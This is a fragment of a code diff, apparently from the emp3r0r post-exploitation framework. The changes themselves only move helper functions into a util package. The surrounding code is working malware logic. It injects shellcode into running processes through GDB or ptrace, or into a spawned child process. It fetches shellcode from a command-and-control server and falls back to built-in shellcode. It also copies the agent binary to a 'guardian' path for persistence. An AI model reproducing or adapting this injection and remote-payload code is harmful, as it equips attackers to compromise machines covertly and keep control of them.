@@ -12,6 +12,7 @@ import (
 	"syscall"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // gdbInjectShellcode inject shellcode to a running process using GDB
@@ -39,7 +40,7 @@ func gdbInjectShellcode(shellcode *string, pid, shellcodeLen int) error {
 
 // pyShellcodeLoader pure python, using ptrace
 func pyShellcodeLoader(shellcode *string, shellcodeLen int) error {
-	if !IsCommandExist("python2") {
+	if !util.IsCommandExist("python2") {
 		return fmt.Errorf("python2 is not found, shellcode loader won't work")
 	}
 
@@ -117,7 +118,7 @@ func Injector(shellcode *string, pid int) error {
 	// check /proc/sys/kernel/yama/ptrace_scope if you cant inject to existing processes
 	if pid == 0 {
 		// start a child process to inject shellcode into
-		sec := strconv.Itoa(RandInt(10, 30))
+		sec := strconv.Itoa(util.RandInt(10, 30))
 		child := exec.Command("sleep", sec)
 		child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
 		err = child.Start()
@@ -262,7 +263,7 @@ func InjectShellcode(pid int, method string) (err error) {
 	sc, err := DownloadViaCC(CCAddress+"shellcode.txt", "")
 	if err != nil {
 		sc = []byte(GuardianShellcode)
-		err = Copy(os.Args[0], GuardianAgentPath)
+		err = util.Copy(os.Args[0], GuardianAgentPath)
 		if err != nil {
 			return
 		}
